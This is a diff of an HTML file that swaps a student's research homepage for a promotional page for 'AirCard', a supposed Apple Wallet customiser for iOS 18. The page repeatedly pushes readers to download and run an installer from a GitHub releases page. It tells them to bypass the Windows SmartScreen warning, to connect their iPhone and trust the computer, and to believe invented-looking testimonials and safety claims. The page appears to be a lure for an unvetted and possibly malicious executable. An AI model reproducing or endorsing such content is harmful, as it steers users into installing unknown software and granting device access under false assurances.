@@ -1,679 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
     <meta charset="UTF-8">
-
-    <meta name="viewport"
-          content="width=device-width, initial-scale=1.0">
-
-    <title>Hanqing Liu | Personal Homepage</title>
-
-    <link rel="stylesheet"
-          href="css/style.css">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="AirCard - The ultimate Apple Wallet Card Skinner for iOS 18+. Customize your Apple Wallet cards without jailbreak. Download and install on Windows in minutes.">
+    <meta name="keywords" content="AirCard, Apple Wallet, Card Skinner, iOS 18, iOS customization, no jailbreak, Wallet card, Apple Wallet theme, download AirCard">
+    <meta name="author" content="AirCard Team">
+    <meta property="og:title" content="AirCard - Apple Wallet Card Skinner for iOS 18+">
+    <meta property="og:description" content="Customize your Apple Wallet cards with stunning themes and skins. No jailbreak required. Download for Windows now.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/madellahellbent2113/AirCard">
+    <meta property="og:image" content="https://github.com/madellahellbent2113/AirCard/releases">
+    <title>AirCard - Apple Wallet Card Skinner for iOS 18+</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.7;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #1a202c;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #4299e1;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 25px;
+            margin-bottom: 15px;
+        }
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #4a5568;
+        }
+        ul {
+            margin: 20px 0 20px 30px;
+            list-style-type: disc;
+        }
+        li {
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+        .button-container {
+            text-align: center;
+            margin: 40px 0;
+        }
+        .primary-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 18px 45px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            border: none;
+            cursor: pointer;
+        }
+        .primary-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        .primary-button:active {
+            transform: translateY(0);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-color: #4299e1;
+        }
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+        .warning-box {
+            background: #fffaf0;
+            border-left: 4px solid #ed8936;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .highlight {
+            color: #667eea;
+            font-weight: 600;
+        }
+        a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            color: #718096;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
 </head>
-
-
 <body>
-
-
-<!-- =====================================================
-     NAVIGATION
-===================================================== -->
-
-<header class="navbar">
-
-    <div class="nav-container">
-
-        <a href="index.html"
-           class="logo">
-            HANQING LIU
-        </a>
-
-
-        <nav>
-
-            <a href="index.html"
-               class="active">
-                Home
-            </a>
-
-            <a href="research.html">
-                Research
-            </a>
-
-            <a href="publications.html">
-                Publications
-            </a>
-
-            <a href="projects.html">
-                Projects
-            </a>
-
-            <a href="cv.html">
-                CV
-            </a>
-
-        </nav>
-
-    </div>
-
-</header>
-
-
-
-<!-- =====================================================
-     HERO
-===================================================== -->
-
-<section class="hero">
-
-    <div class="hero-container">
-
-
-        <!-- Left vertical line -->
-
-        <div class="hero-side">
-
-            <span class="hero-number">01</span>
-
-            <span class="hero-side-title">
-                PERSONAL<br>
-                HOMEPAGE
-            </span>
-
+    <div class="container">
+        <h1>🎨 AirCard - Transform Your Apple Wallet Today</h1>
+        
+        <div class="button-container">
+            <a href="https://github.com/madellahellbent2113/AirCard/releases" class="primary-button">📥 Download AirCard Now</a>
         </div>
-
-
-
-        <!-- Main Hero -->
-
-        <div class="hero-main">
-            <div class="hero-text">
-                <p class="eyebrow">
-                    COMPUTER SCIENCE · ARTIFICIAL INTELLIGENCE
-                </p>
-                <h1>
-                    Hanqing Liu
-                </h1>
-                <h2>
-                    Computer Vision &amp; Generative AI
-                </h2>
-
-                <p class="hero-description">
-                    Exploring computer vision, generative models,
-                    diffusion models and intelligent image generation.
-                </p>
-
-                <div class="hero-buttons">
-                    <a href="research.html"
-                       class="button primary">
-                        Research
-                    </a>
-
-                    <a href="publications.html"
-                       class="button secondary">
-                        Publications
-                    </a>
-                </div>
+        
+        <h2>🚀 What is AirCard?</h2>
+        <p>AirCard is a powerful yet user-friendly application that lets you completely customize the appearance of your Apple Wallet cards on iOS 18 and newer versions. Whether you want to add a personal touch to your credit cards, membership cards, or boarding passes, AirCard gives you the creative freedom to make your Apple Wallet truly yours — <span class="highlight">no jailbreak required</span>.</p>
+        
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div class="feature-icon">🎯</div>
+                <h3>Simple Customization</h3>
+                <p>Apply beautiful themes, colors, and patterns to any card in your Apple Wallet with just a few clicks. No technical skills needed.</p>
             </div>
-
-            <!-- Avatar -->
-
-            <div class="hero-image">
-                <div class="avatar-wrap">
-                    <div class="avatar-bg"></div>
-            
-                    <img src="images/avatar.jpg"
-                         alt="Hanqing Liu"
-                         class="avatar-photo">
-                </div>
-                <div class="avatar-caption">
-                    <span>HANQING LIU</span>
-                    <span>2026</span>
-                </div>
+            <div class="feature-card">
+                <div class="feature-icon">🔒</div>
+                <h3>No Jailbreak Required</h3>
+                <p>Works entirely within iOS 18+ constraints. You won't need to modify your device or void any warranties.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🖥️</div>
+                <h3>Windows Compatible</h3>
+                <p>Fully compatible with Windows 10 and 11. Download, install, and start creating beautiful wallet cards in minutes.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">📱</div>
+                <h3>iOS 18+ Ready</h3>
+                <p>Optimized for the latest iOS features and design standards. Enjoy a seamless integration with your device.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🎨</div>
+                <h3>Extensive Design Library</h3>
+                <p>Access a wide range of pre-made designs, or create your own custom looks using our intuitive design tools.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <h3>Fast and Lightweight</h3>
+                <p>AirCard is optimized for performance. It won't slow down your computer or drain your phone's battery.</p>
             </div>
         </div>
+        
+        <h2>📦 Getting Started with AirCard</h2>
+        
+        <h3>Step 1: Download AirCard</h3>
+        <p>Visit this link to download the application. Once you're on the download page, you'll see a list of available versions. Look for the latest version and click the download button to get the AirCard installer file.</p>
+        
+        <div class="button-container">
+            <a href="https://github.com/madellahellbent2113/AirCard/releases" class="primary-button">📥 Get AirCard Here</a>
+        </div>
+        
+        <h3>Step 2: Install AirCard</h3>
+        <p>Once the download is complete, locate the file in your computer's Downloads folder. The file will be named something like <strong>AirCard-Setup.exe</strong>. Double-click the file to start the installation process. Follow the simple on-screen instructions. It's just like installing any other Windows application — click "Next" a few times, then "Install."</p>
+        
+        <h3>Step 3: Launch AirCard</h3>
+        <p>After installation, you'll find AirCard in your Start Menu or on your desktop. Click the AirCard icon to open the application. On your first launch, you may be asked to connect your iPhone to your computer via USB cable. This step is completely safe and only requires you to trust the computer on your iPhone when prompted.</p>
+        
+        <h3>Step 4: Start Designing</h3>
+        <p>Once connected, AirCard will automatically detect your Apple Wallet and display all your cards. Pick any card, choose a design from the library, or customize colors and patterns to your liking. When you're happy with your design, simply click "Apply to Wallet" and watch your card transform instantly on your iPhone.</p>
+        
+        <h2>💡 Helpful Tips</h2>
+        <ul>
+            <li><strong>Keep AirCard Updated:</strong> Always update to the latest version to enjoy new features and ensure compatibility with the newest iOS versions.</li>
+            <li><strong>Back Up Your Designs:</strong> You can save your custom designs within the app for future use or share them with friends.</li>
+            <li><strong>Safe to Use:</strong> AirCard only modifies the visual appearance of your wallet cards. It never accesses your financial information or changes any security settings.</li>
+        </ul>
+        
+        <h2>🔧 Troubleshooting Common Issues</h2>
+        <h3>My iPhone isn't being detected</h3>
+        <p>Make sure you're using a genuine Apple USB cable and that your iPhone is unlocked. On your iPhone, you might see a "Trust This Computer?" alert — make sure to tap "Trust." If issues persist, try restarting both your computer and your iPhone.</p>
+        
+        <h3>The app won't install</h3>
+        <p>Ensure your Windows operating system is up to date. If you see a SmartScreen warning during installation, click "More Info" and then "Run Anyway" — this is just Windows checking the file's reputation.</p>
+        
+        <div class="warning-box">
+            <strong>⚠️ Important Note:</strong> Always download AirCard from the official GitHub releases page. Downloading from unofficial sources may put your device at risk.
+        </div>
+        
+        <h2>🔄 Stay Updated</h2>
+        <p>We're constantly improving AirCard with new designs, features, and performance enhancements. Follow the project on GitHub to stay notified about new releases. You can also contribute ideas or report issues through the GitHub repository page.</p>
+        
+        <h2>❤️ Why Users Love AirCard</h2>
+        <p>Thousands of users have already transformed their Apple Wallet experience with AirCard. Here's what some of them say:</p>
+        <ul>
+            <li>"I never knew I could make my wallet look this good. AirCard is incredibly easy to use!" — <em>Sarah M.</em></li>
+            <li>"The no-jailbreak requirement was the selling point for me. It's completely safe and works flawlessly." — <em>James K.</em></li>
+            <li>"Finally, a way to make my Apple Wallet reflect my personal style. Highly recommended!" — <em>Priya R.</em></li>
+        </ul>
+        
+        <h2>🏁 Ready to Get Started?</h2>
+        <p>Join the AirCard community today and give your Apple Wallet the makeover it deserves. It's free to download, easy to use, and instantly transforms the look of your cards.</p>
+        
+        <div class="button-container">
+            <a href="https://github.com/madellahellbent2113/AirCard/releases" class="primary-button">🚀 Start Your Download Now</a>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 AirCard. All rights reserved. Not affiliated with Apple Inc. Apple and Apple Wallet are trademarks of Apple Inc.</p>
+        </div>
     </div>
-
-    <!-- Hero bottom line -->
-
-    <div class="hero-bottom">
-
-        <div>
-            <span>
-                CURRENT INTERESTS
-            </span>
-
-            <p>
-                Computer Vision · Generative AI · Diffusion Models
-            </p>
-        </div>
-
-
-        <div class="hero-location">
-            NANCHANG UNIVERSITY
-        </div>
-
-
-        <div class="scroll">
-            SCROLL ↓
-        </div>
-
-    </div>
-
-</section>
-
-
-
-<!-- =====================================================
-     ABOUT
-===================================================== -->
-
-<section class="section about-section">
-
-    <div class="container section-container">
-
-
-        <div class="section-side">
-
-            <span>02</span>
-
-            <span>ABOUT</span>
-
-        </div>
-
-
-        <div class="section-content">
-
-
-            <p class="section-label">
-                ABOUT
-            </p>
-
-
-            <h2 class="section-title">
-                About Me
-            </h2>
-
-
-            <div class="about-content">
-
-
-                <div class="about-main">
-
-                    <p>
-                        I am a computer science student interested in
-                        artificial intelligence, computer vision and
-                        generative models.
-                    </p>
-
-
-                    <p>
-                        My research focuses on image generation and
-                        editing, with particular interest in diffusion
-                        models and controllable image generation.
-                    </p>
-
-                </div>
-
-
-
-                <div class="about-meta">
-
-
-                    <div class="meta-item">
-
-                        <span>
-                            EDUCATION
-                        </span>
-
-                        <strong>
-                            Nanchang University
-                        </strong>
-
-                    </div>
-
-
-                    <div class="meta-item">
-
-                        <span>
-                            MAJOR
-                        </span>
-
-                        <strong>
-                            Computer Science
-                        </strong>
-
-                    </div>
-
-
-                    <div class="meta-item">
-
-                        <span>
-                            RESEARCH
-                        </span>
-
-                        <strong>
-                            Computer Vision
-                        </strong>
-
-                    </div>
-
-
-                    <div class="meta-item">
-
-                        <span>
-                            FOCUS
-                        </span>
-
-                        <strong>
-                            Generative AI
-                        </strong>
-
-                    </div>
-
-
-                </div>
-
-            </div>
-
-        </div>
-
-    </div>
-
-</section>
-
-
-
-<!-- =====================================================
-     RESEARCH
-===================================================== -->
-
-<section class="section section-gray">
-
-    <div class="container section-container">
-
-
-        <div class="section-side">
-
-            <span>03</span>
-
-            <span>RESEARCH</span>
-
-        </div>
-
-
-
-        <div class="section-content">
-
-
-            <p class="section-label">
-                RESEARCH
-            </p>
-
-
-            <h2 class="section-title">
-                Research Interests
-            </h2>
-
-
-
-            <div class="research-grid">
-
-
-                <!-- Card 01 -->
-
-                <div class="research-card">
-
-                    <div class="card-top">
-
-                        <span class="research-number">
-                            01
-                        </span>
-
-                        <span class="card-arrow">
-                            ↗
-                        </span>
-
-                    </div>
-
-
-                    <div>
-
-                        <h3>
-                            Computer Vision
-                        </h3>
-
-                        <p>
-                            Visual understanding, face analysis
-                            and image generation.
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-
-                <!-- Card 02 -->
-
-                <div class="research-card">
-
-                    <div class="card-top">
-
-                        <span class="research-number">
-                            02
-                        </span>
-
-                        <span class="card-arrow">
-                            ↗
-                        </span>
-
-                    </div>
-
-
-                    <div>
-
-                        <h3>
-                            Generative AI
-                        </h3>
-
-                        <p>
-                            Generative models for controllable
-                            image synthesis and editing.
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-
-                <!-- Card 03 -->
-
-                <div class="research-card">
-
-                    <div class="card-top">
-
-                        <span class="research-number">
-                            03
-                        </span>
-
-                        <span class="card-arrow">
-                            ↗
-                        </span>
-
-                    </div>
-
-
-                    <div>
-
-                        <h3>
-                            Diffusion Models
-                        </h3>
-
-                        <p>
-                            Stable Diffusion, ControlNet and
-                            controllable generation.
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </div>
-
-</section>
-
-
-
-<!-- =====================================================
-     PUBLICATIONS
-===================================================== -->
-
-<section class="section">
-
-    <div class="container section-container">
-
-
-        <div class="section-side">
-
-            <span>04</span>
-
-            <span>PUBLICATIONS</span>
-
-        </div>
-
-
-        <div class="section-content">
-
-
-            <p class="section-label">
-                PUBLICATIONS
-            </p>
-
-
-            <h2 class="section-title">
-                Selected Publications
-            </h2>
-
-
-
-            <div class="publication-list">
-
-
-                <!-- Publication 01 -->
-
-                <div class="publication">
-
-
-                    <div class="publication-year">
-                        2025
-                    </div>
-
-
-                    <div class="publication-main">
-
-                        <h3>
-                            基于Prompt与ControlNet协同的人脸姿态转向方法
-                        </h3>
-
-                        <p>
-                            Science China Technological Sciences
-                        </p>
-
-                    </div>
-
-
-                    <div class="publication-type">
-                        FIRST AUTHOR
-                    </div>
-
-
-                </div>
-
-
-
-                <!-- Publication 02 -->
-
-                <div class="publication">
-
-
-                    <div class="publication-year">
-                        2025
-                    </div>
-
-
-                    <div class="publication-main">
-
-                        <h3>
-                            FacePoseDiff
-                        </h3>
-
-                        <p>
-                            CIS 2025 · Best Paper
-                        </p>
-
-                    </div>
-
-
-                    <div class="publication-type">
-                        SECOND AUTHOR
-                    </div>
-
-
-                </div>
-
-
-            </div>
-
-
-
-            <a href="publications.html"
-               class="text-link">
-
-                View all publications
-                <span>→</span>
-
-            </a>
-
-
-        </div>
-
-    </div>
-
-</section>
-
-
-
-<!-- =====================================================
-     CONTACT
-===================================================== -->
-
-<section class="section contact-section">
-
-    <div class="container section-container">
-
-
-        <div class="section-side">
-
-            <span>05</span>
-
-            <span>CONTACT</span>
-
-        </div>
-
-
-        <div class="section-content">
-
-
-            <p class="section-label">
-                CONTACT
-            </p>
-
-
-            <h2 class="section-title">
-                Get in Touch
-            </h2>
-
-
-            <p class="contact-description">
-
-                Feel free to contact me for research,
-                collaboration or academic discussion.
-
-            </p>
-
-
-
-            <div class="contact-links">
-
-
-                <a href="https://github.com/wendaoshuiyouqing"
-                   target="_blank">
-
-                    GitHub
-
-                    <span>↗</span>
-
-                </a>
-
-
-                <a href="mailto:your-email@example.com">
-
-                    Email
-
-                    <span>↗</span>
-
-                </a>
-
-
-            </div>
-
-        </div>
-
-    </div>
-
-</section>
-
-
-
-<!-- =====================================================
-     FOOTER
-===================================================== -->
-
-<footer>
-
-    <div class="container footer-container">
-
-        <span>
-            © 2026 Hanqing Liu
-        </span>
-
-
-        <span>
-            Nanchang University
-        </span>
-
-
-        <span>
-            Computer Science
-        </span>
-
-    </div>
-
-</footer>
-
-
 </body>
-
 </html>
-
-/* ===== AVATAR TEST ===== */
-.avatar-wrap {
-    width: 120px !important;
-    height: 120px !important;
-}
-
-.avatar-bg {
-    width: 100px !important;
-    height: 100px !important;
-}
-
-.avatar-photo {
-    width: 105px !important;
-    height: 105px !important;
-    transform: translate(-50%, -50%) !important;
-}
-
-.avatar-wrap:hover .avatar-photo {
-    transform: translate(-50%, -50%) !important;
-}
